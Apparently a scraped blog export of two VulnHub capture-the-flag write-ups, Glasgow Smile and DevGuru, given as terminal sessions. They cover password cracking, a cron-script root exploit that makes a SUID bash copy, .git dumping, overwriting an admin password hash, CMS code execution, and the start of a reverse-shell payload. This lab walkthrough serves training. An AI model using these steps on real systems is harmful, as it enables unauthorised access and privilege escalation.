ls -l SomeoneWhoHidesBehindAMask/ ls: cannot access &#39;SomeoneWhoHidesBehindAMask/user3.txt&#39;: Permission denied ls: cannot access &#39;SomeoneWhoHidesBehindAMask/find&#39;: Permission denied ls: cannot access &#39;SomeoneWhoHidesBehindAMask/PeopleAreStartingToNotice.txt&#39;: Permission denied total 0 -????????? ? ? ? ? ? find -????????? ? ? ? ? ? PeopleAreStartingToNotice.txt -????????? ? ? ? ? ? user3.txt Unzip dear_penguins.zip There is a password Create wordlist w/ info.txt ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip] └─# cewl localhost/info.txt -w cewl_info.txt Compile all passwords we have ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip] └─# cp ../sql/base64decode.txt . ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip] └─# cat base64decode.txt cewl_info.txt passwords.txt &amp;gt;&amp;gt; compiled_passwords.txt ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip] └─# echo -n I33hope99my0death000makes44more8cents00than0my0life0 &amp;gt;&amp;gt; compiled_passwords.txt Crack it w/ john ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip] └─# john john_zip --wordlist=compiled_passwords.txt Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status I33hope99my0death000makes44more8cents00than0my0life0 (dear_penguins.zip/dear_penguins) 1g 0:00:00:00 DONE (2022-01-27 16:45) 100.0g/s 22700p/s 22700c/s 22700C/s baneishere..Joomla Same password as abner View extracted file ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip] └─# unzip dear_penguins.zip Archive: dear_penguins.zip [dear_penguins.zip] dear_penguins password: inflating: dear_penguins ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip] └─# cat dear_penguins My dear penguins, we stand on a great threshold! It&#39;s okay to be scared; many of you won&#39;t be coming back. Thanks to Batman, the time has come to punish all of God&#39;s children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!! scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz ┌──(root💀kali)-[~/vulnHub/Glasglow-Smile-1.1/192.168.1.1/loot/zip] └─# echo -n scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz &amp;gt;&amp;gt; compiled_passwords.txt penguin:scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz Switch to user penguin User Flag 3 penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat user3.txt JKR{284a3753ec11a592ee34098b8cb43d52} Root - Via Cronjob View files in /home/penguin/SomeoneWhoHidesBehindAMask penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la total 332 drwxr--r-- 2 penguin penguin 4096 Jan 27 02:59 . drwxr-xr-x 5 penguin penguin 4096 Jun 16 2020 .. -rwsr-x--x 1 penguin penguin 315904 Jun 15 2020 find -rw-r----- 1 penguin root 1457 Jun 15 2020 PeopleAreStartingToNotice.txt -rwxr-xr-x 1 penguin root 664 Jan 27 02:59 .trash_old -rw-r----- 1 penguin penguin 38 Jun 16 2020 user3.txt find SUID Binary is useless because owner is penguin .trash_old PeopleAreStartingToNotice.txt View files Could not find any way to privilege escalate Assume .trash_old is executed by cronjob, replace it to spawn a root shell penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ printf &#39;#!/bin/bash\\n\\ncp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod u+s /tmp/rootbash\\n&#39; &amp;gt; /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old; chmod 4777 /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -l /tmp total 1152 -rwsr-xr-x 1 root root 1168776 Jan 27 03:07 rootbash Obtain root shell Root Flag rootbash-5.0# cd /root rootbash-5.0# ls root.txt whoami rootbash-5.0# cat root.txt ▄████ ██▓ ▄▄▄ ██████ ▄████ ▒█████ █ █░ ██████ ███▄ ▄███▓██▓██▓ ▓█████ ██▒ ▀█▓██▒ ▒████▄ ▒██ ▒ ██▒ ▀█▒██▒ ██▓█░ █ ░█░ ▒██ ▒▓██▒▀█▀ ██▓██▓██▒ ▓█ ▀ ▒██░▄▄▄▒██░ ▒██ ▀█▄ ░ ▓██▄ ▒██░▄▄▄▒██░ ██▒█░ █ ░█ ░ ▓██▄ ▓██ ▓██▒██▒██░ ▒███ ░▓█ ██▒██░ ░██▄▄▄▄██ ▒ ██░▓█ ██▒██ ██░█░ █ ░█ ▒ ██▒██ ▒██░██▒██░ ▒▓█ ▄ ░▒▓███▀░██████▓█ ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓ ▒██████▒▒██▒ ░██░██░██████░▒████▒ ░▒ ▒░ ▒░▓ ▒▒ ▓▒█▒ ▒▓▒ ▒ ░░▒ ▒░ ▒░▒░▒░░ ▓░▒ ▒ ▒ ▒▓▒ ▒ ░ ▒░ ░ ░▓ ░ ▒░▓ ░░ ▒░ ░ ░ ░░ ░ ▒ ░▒ ▒▒ ░ ░▒ ░ ░ ░ ░ ░ ▒ ▒░ ▒ ░ ░ ░ ░▒ ░ ░ ░ ░▒ ░ ░ ▒ ░░ ░ ░ ░ ░ ░ ░ ░ ░ ▒ ░ ░ ░ ░ ░ ░░ ░ ░ ▒ ░ ░ ░ ░ ░ ░ ░ ▒ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ Congratulations! You&#39;ve got the Glasgow Smile! JKR{68028b11a1b7d56c521a90fc18252995} Credits by mindsflee Snoop processes w/o root privileges penguin@glasgowsmile:/tmp$ ./pspy64 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 2022/01/27 03:13:01 CMD: UID=0 PID=13411 | /usr/sbin/CRON -f 2022/01/27 03:13:01 CMD: UID=0 PID=13412 | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 2022/01/27 03:13:01 CMD: UID=0 PID=13413 | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 2022/01/27 03:13:01 CMD: UID=0 PID=13414 | /bin/bash /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 2022/01/27 03:13:12 CMD: UID=0 PID=13415 | 2022/01/27 03:14:01 CMD: UID=0 PID=13416 | /usr/sbin/CRON -f 2022/01/27 03:14:02 CMD: UID=0 PID=13417 | /usr/sbin/CRON -f 2022/01/27 03:14:02 CMD: UID=0 PID=13418 | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 2022/01/27 03:14:02 CMD: UID=0 PID=13419 | /bin/bash /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 2022/01/27 03:15:01 CMD: UID=0 PID=13420 | /usr/sbin/CRON -f 2022/01/27 03:15:01 CMD: UID=0 PID=13421 | /usr/sbin/CRON -f 2022/01/27 03:15:01 CMD: UID=0 PID=13422 | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 2022/01/27 03:15:01 CMD: UID=0 PID=13423 | /bin/bash /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old We can see that cronjob is executing .trash_old every minute " }, { "title": "Vulnhub - DevGuru 1", "url": "/posts/DevGuru-1/", "categories": "Vulnhub, Linux", "tags": "linux-priv-esc/linux-creds-found, tcp/80-http/web-app-cms-exploit", "date": "2022-02-02 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Sat Jan 22 19:16:13 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/DevGuru/192.168.236.6/scans/_full_tcp_nmap.txt -oX /root/vulnHub/DevGuru/192.168.236.6/scans/xml/_full_tcp_nmap.xml 192.168.236.6mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversWarning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex &#39;^HTTP/1\\.0 404 Not Found\\r\\n(?:[^&amp;lt;]+|&amp;lt;(?!/head&amp;gt;))*?&amp;lt;style&amp;gt;\\nbody \\{ background-color: #fcfcfc; color: #333333; margin: 0; padding:0; \\}\\nh1 \\{ font-size: 1\\.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; \\}\\nh1, p \\{ padding-left: 10px; \\}\\ncode\\.url \\{ background-color: #eeeeee; font-family:monospace; padding:0 2px;\\}\\n&amp;lt;/style&amp;gt;&#39;Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex &#39;^HTTP/1\\.0 404 Not Found\\r\\n(?:[^&amp;lt;]+|&amp;lt;(?!/head&amp;gt;))*?&amp;lt;style&amp;gt;\\nbody \\{ background-color: #ffffff; color: #000000; \\}\\nh1 \\{ font-family: sans-serif; font-size: 150%; background-color: #9999cc; font-weight: bold; color: #000000; margin-top: 0;\\}\\n&amp;lt;/style&amp;gt;&#39;adjust_timeouts2: packet supposedly had rtt of -126797 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -126797 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -351260 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -351260 microseconds. Ignoring time.Nmap scan report for 192.168.236.6Host is up, received arp-response (0.00034s latency).Scanned at 2022-01-22 19:16:14 +08 for 265sNot shown: 65532 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+lft/kQdC+3L4qMerPmpboe5GOrB60x+QU0R7hjmxY+9bNqST//1+Oa7ycVotqdlk4EtxgnqE2B4mRTNb16mITv/Y8UfsCqYAuy3C8lV9HzG6zgsXgnAhvpMmY31fZqz+dKamnp1W1o+scbnzRNqr/fE1+Yz7Fcu4JvAJ/4NLQS9CHmZh+N12OyF8eVOQmjPeRVHR8BiptinM+EXis4xpOQiuZoEBPkyqhXcBW65CAXlkjuuJ6KpJ7Y3Gbse38L6LKGFs8Hl5k1jbuTxDg8CT+rzzy6on8niDDfcVwHTvZ1JqlUpzjaGifDD8gV60ebRa5/36ORI+ed6G9v1HOW3r| 256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQzBnXE0Ezf7XOzh2KxdMAetOtoTEmfiCh2OSwjnIpAzd1osDr7UsuNt/5m45OgfWVAcVnu3ECEuQZ03P4VxkU=| 256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINjsvy3HYYZxlENx0Fmval1Ax8ApGBKu6wf5sjK8xuv280/tcp open http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))|_http-title: Corp - DevGuru| http-git: | 192.168.236.6:80/.git/| Git repository found!| Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...| Last commit message: first commit | Remotes:| http://devguru.local:8585/frank/devguru-website.git|_ Project type: PHP application (guessed from .gitignore)|_http-generator: DevGuru| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.29 (Ubuntu)8585/tcp open unknown syn-ack ttl 64| fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest: | HTTP/1.0 200 OK| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gitea=2f428c4ac55f1c18; Path=/; HttpOnly| Set-Cookie: _csrf=lENihkNa2WujFFhlk1uKO9MzSk46MTY0Mjg3ODk4MzAyMDk1OTkzNw; Path=/; Expires=Sun, 23 Jan 2022 19:16:23 GMT; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Sat, 22 Jan 2022 19:16:23 GMT| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&amp;gt;| &amp;lt;head data-suburl=&quot;&quot;&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;| &amp;lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&amp;gt;| &amp;lt;title&amp;gt; Gitea: Git with a cup of tea &amp;lt;/title&amp;gt;| &amp;lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;&amp;gt;| &amp;lt;meta name=&quot;theme-color&quot; content=&quot;#6cc644&quot;&amp;gt;| &amp;lt;meta name=&quot;author&quot; content=&quot;Gitea - Git with a cup of tea&quot; /&amp;gt;| &amp;lt;meta name=&quot;description&quot; content=&quot;Gitea (Git with a cup of tea) is a painless| HTTPOptions: | HTTP/1.0 404 Not Found| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gitea=785c9c97bebd9516; Path=/; HttpOnly| Set-Cookie: _csrf=yO5GDioNp2YyN3W237omCxqKCK86MTY0Mjg3ODk4MzA0MzgwNDc3MA; Path=/; Expires=Sun, 23 Jan 2022 19:16:23 GMT; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Sat, 22 Jan 2022 19:16:23 GMT| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&amp;gt;| &amp;lt;head data-suburl=&quot;&quot;&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;| &amp;lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&amp;gt;| &amp;lt;title&amp;gt;Page Not Found - Gitea: Git with a cup of tea &amp;lt;/title&amp;gt;| &amp;lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot; crossorigin=&quot;use-credentials&quot;&amp;gt;| &amp;lt;meta name=&quot;theme-color&quot; content=&quot;#6cc644&quot;&amp;gt;| &amp;lt;meta name=&quot;author&quot; content=&quot;Gitea - Git with a cup of tea&quot; /&amp;gt;|_ &amp;lt;meta name=&quot;description&quot; content=&quot;Gitea (Git with a c1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8585-TCP:V=7.92%I=9%D=1/22%Time=61EBE788%P=x86_64-pc-linux-gnu%r(GeSF:nericLines,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20tSF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\xSF:20Request&quot;)%r(GetRequest,2A00,&quot;HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\SF:x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20Path=/;SF:\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=2f428c4ac55f1c18;SF:\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=lENihkNa2WujFFhlk1uKO9MSF:zSk46MTY0Mjg3ODk4MzAyMDk1OTkzNw;\\x20Path=/;\\x20Expires=Sun,\\x2023\\x20JaSF:n\\x202022\\x2019:16:23\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Options:\\x20SAMEORSF:IGIN\\r\\nDate:\\x20Sat,\\x2022\\x20Jan\\x202022\\x2019:16:23\\x20GMT\\r\\n\\r\\n&amp;lt;!SF:DOCTYPE\\x20html&amp;gt;\\n&amp;lt;html\\x20lang=\\&quot;en-US\\&quot;\\x20class=\\&quot;theme-\\&quot;&amp;gt;\\n&amp;lt;head\\xSF:20data-suburl=\\&quot;\\&quot;&amp;gt;\\n\\t&amp;lt;meta\\x20charset=\\&quot;utf-8\\&quot;&amp;gt;\\n\\t&amp;lt;meta\\x20name=\\&quot;vSF:iewport\\&quot;\\x20content=\\&quot;width=device-width,\\x20initial-scale=1\\&quot;&amp;gt;\\n\\t&amp;lt;meSF:ta\\x20http-equiv=\\&quot;x-ua-compatible\\&quot;\\x20content=\\&quot;ie=edge\\&quot;&amp;gt;\\n\\t&amp;lt;title&amp;gt;SF:\\x20Gitea:\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\x20&amp;lt;/title&amp;gt;\\n\\t&amp;lt;linkSF:\\x20rel=\\&quot;manifest\\&quot;\\x20href=\\&quot;/manifest\\.json\\&quot;\\x20crossorigin=\\&quot;use-cSF:redentials\\&quot;&amp;gt;\\n\\t&amp;lt;meta\\x20name=\\&quot;theme-color\\&quot;\\x20content=\\&quot;#6cc644\\&quot;&amp;gt;\\SF:n\\t&amp;lt;meta\\x20name=\\&quot;author\\&quot;\\x20content=\\&quot;Gitea\\x20-\\x20Git\\x20with\\x20aSF:\\x20cup\\x20of\\x20tea\\&quot;\\x20/&amp;gt;\\n\\t&amp;lt;meta\\x20name=\\&quot;description\\&quot;\\x20contenSF:t=\\&quot;Gitea\\x20\\(Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\)\\x20is\\x20a\\x20paiSF:nless&quot;)%r(HTTPOptions,212A,&quot;HTTP/1\\.0\\x20404\\x20Not\\x20Found\\r\\nContentSF:-Type:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20SF:Path=/;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=785c9c97beSF:bd9516;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=yO5GDioNp2YyN3W2SF:37omCxqKCK86MTY0Mjg3ODk4MzA0MzgwNDc3MA;\\x20Path=/;\\x20Expires=Sun,\\x202SF:3\\x20Jan\\x202022\\x2019:16:23\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Options:\\x2SF:0SAMEORIGIN\\r\\nDate:\\x20Sat,\\x2022\\x20Jan\\x202022\\x2019:16:23\\x20GMT\\r\\SF:n\\r\\n&amp;lt;!DOCTYPE\\x20html&amp;gt;\\n&amp;lt;html\\x20lang=\\&quot;en-US\\&quot;\\x20class=\\&quot;theme-\\&quot;&amp;gt;\\nSF:&amp;lt;head\\x20data-suburl=\\&quot;\\&quot;&amp;gt;\\n\\t&amp;lt;meta\\x20charset=\\&quot;utf-8\\&quot;&amp;gt;\\n\\t&amp;lt;meta\\x20nSF:ame=\\&quot;viewport\\&quot;\\x20content=\\&quot;width=device-width,\\x20initial-scale=1\\&quot;&amp;gt;SF:\\n\\t&amp;lt;meta\\x20http-equiv=\\&quot;x-ua-compatible\\&quot;\\x20content=\\&quot;ie=edge\\&quot;&amp;gt;\\n\\tSF:&amp;lt;title&amp;gt;Page\\x20Not\\x20Found\\x20-\\x20\\x20Gitea:\\x20Git\\x20with\\x20a\\x20cSF:up\\x20of\\x20tea\\x20&amp;lt;/title&amp;gt;\\n\\t&amp;lt;link\\x20rel=\\&quot;manifest\\&quot;\\x20href=\\&quot;/manSF:ifest\\.json\\&quot;\\x20crossorigin=\\&quot;use-credentials\\&quot;&amp;gt;\\n\\t&amp;lt;meta\\x20name=\\&quot;thSF:eme-color\\&quot;\\x20content=\\&quot;#6cc644\\&quot;&amp;gt;\\n\\t&amp;lt;meta\\x20name=\\&quot;author\\&quot;\\x20contSF:ent=\\&quot;Gitea\\x20-\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\&quot;\\x20/&amp;gt;\\n\\t&amp;lt;meSF:ta\\x20name=\\&quot;description\\&quot;\\x20content=\\&quot;Gitea\\x20\\(Git\\x20with\\x20a\\x20SF:c&quot;);MAC Address: 08:00:27:B9:F2:2E (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/22%OT=22%CT=1%CU=40527%PV=Y%DS=1%DC=D%G=Y%M=080027%TOS:M=61EBE887%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=IOS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%OOS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=OOS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=OS:N%T=40%CD=S)Uptime guess: 26.965 days (since Sun Dec 26 20:10:20 2021)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=260 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.34 ms 192.168.236.6Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Jan 22 19:20:39 2022 -- 1 IP address (1 host up) scanned in 266.55 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/DevGuru/192.168.236.6]└─# ffuf -u http://192.168.236.6/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &quot;.html,.php,.txt&quot; -fw 1,2,20 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.236.6/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .php .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 1,2,20________________________________________________.htaccess [Status: 200, Size: 1678, Words: 282, Lines: 53] [Status: 200, Size: 12669, Words: 929, Lines: 331]0 [Status: 200, Size: 12669, Words: 929, Lines: 331]about [Status: 200, Size: 18661, Words: 977, Lines: 478]backend [Status: 302, Size: 410, Words: 60, Lines: 12]index.php [Status: 200, Size: 12719, Words: 929, Lines: 331]Services [Status: 200, Size: 10032, Words: 815, Lines: 267]:: Progress: [18460/18460] :: Job [1/1] :: 42 req/sec :: Duration: [0:06:45] :: Errors: 6 :: backend htaccess Nikto ```┌──(root💀kali)-[~/vulnHub/DevGuru]└─# nikto -ask=no -h http://192.168.236.6:80 2&amp;gt;&amp;amp;1 | tee “/root/vulnHub/DevGuru/192.168.236.6/scans/tcp80/tcp_80_http_nikto.txt” Nikto v2.1.6 Target IP: 192.168.236.6 Target Hostname: 192.168.236.6 Target Port: 80 Start Time: 2022-01-22 20:39:22 (GMT8) Server: Apache/2.4.29 (Ubuntu) The anti-clickjacking X-Frame-Options header is not present. The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type No CGI Directories found (use ‘-C all’ to force check all possible dirs) Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. OSVDB-3093: /.htaccess: Contains configuration and/or authorization information OSVDB-3233: /icons/README: Apache default file found. OSVDB-3092: /.git/index: Git Index file may contain directory listing information. /.git/HEAD: Git HEAD file found. Full repo details may be present. /.git/config: Git config file found. Infos about repo details may be present. X-XSS-Protection header has been set to disable XSS Protection. There is unlikely to be a good reason for this. /.gitignore: .gitignore file found. It is possible to grasp the directory structure. 7915 requests: 0 error(s) and 11 item(s) reported on remote host End Time: 2022-01-22 20:45:54 (GMT8) (392 seconds) 1 host(s) tested``` Git Repository Found: .git .git/index .git/HEAD .git/config .gitignore TCP/8585 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/DevGuru]└─# ffuf -u http://192.168.236.6:8585/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &quot;.html,.txt,.php&quot; -fw 2 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.236.6:8585/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 2________________________________________________ [Status: 200, Size: 10383, Words: 807, Lines: 296]debug [Status: 200, Size: 160, Words: 18, Lines: 5]:: Progress: [18460/18460] :: Job [1/1] :: 741 req/sec :: Duration: [0:00:28] :: Errors: 0 ::Initial FootholdTCP/8585 - Gitea Proceed to debug Both directories returned 404. Gitea: 1.12.5 Proceed to http://192.168.236.6:8585/explore/users frank Found an exploit that requires authentication ┌──(root💀kali)-[~/tools/GitTools/Extractor] └─# searchsploit gitea 1.12.5 ------------------------------------------------------------------------------------ Exploit Title | Path ------------------------------------------------------------------------------------ Gitea 1.12.5 - Remote Code Execution (Authenticated) | multiple/webapps/49571.py ------------------------------------------------------------------------------------ Unable to use exploit, no valid credentialsTCP/80 - October CMS (RCE) View .htaccess Black Listed: (Not allowed to access) ^bootstrap/.* index.php: Redirects to index.php ^: matches the beginning of a string L,NC: L: process the rule immediately when match NC: no case White Listed: /adminer.php View enumerated directories backend adminer.php No exploits found for adminer 4.7.7 Extract all contents from .git w/ gitdumper.sh ┌──(root💀kali)-[~/tools/GitTools/Dumper] └─# ./gitdumper.sh http://192.168.236.6/.git/ /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru [+] Creating /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru/.git/ [+] Downloaded: HEAD [-] Downloaded: objects/info/packs [+] Downloaded: description [+] Downloaded: config [+] Downloaded: COMMIT_EDITMSG [+] Downloaded: index [-] Downloaded: packed-refs [+] Downloaded: refs/heads/master [-] Downloaded: refs/remotes/origin/HEAD [-] Downloaded: refs/stash [+] Downloaded: logs/HEAD ... Recover incomplete git repositories w/ extractor.sh ┌──(root💀kali)-[~/tools/GitTools/Extractor] └─# ./extractor.sh /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru/ /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru_dump/ [+] Found commit: 7de9115700c5656c670b34987c6fbffd39d90cf2 [+] Found file: /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru_dump//0-7de9115700c5656c670b34987c6fbffd39d90cf2/.gitignore [+] Found file: /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru_dump//0-7de9115700c5656c670b34987c6fbffd39d90cf2/.htaccess [+] Found file: /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru_dump//0-7de9115700c5656c670b34987c6fbffd39d90cf2/README.md [+] Found file: /root/vulnHub/DevGuru/192.168.236.6/loot/http/devguru_dump//0-7de9115700c5656c670b34987c6fbffd39d90cf2/adminer.php ... View config/database.php october:SQ66EBYx4GT3byXH Login to Adminer View backend_users Generate hash ┌──(root💀kali)-[~/tools/GitTools/Extractor] └─# htpasswd -nbBC 10 frank password frank:$2y$10$RT6DEmOZIxbj/uv0MLyEWuPUMNSr6s1r7JXzCCOI/kHZCiq/0cN9. Replace frank’s hash Login Proceed to CMS -&amp;gt; Home Insert code execution functionality Test RCE Encode payload ┌──(root💀kali)-[~/vulnHub/DevGuru/192.168.236.6/exploit]└─# hURL --URL &quot;rm /tmp/f;mkfifo 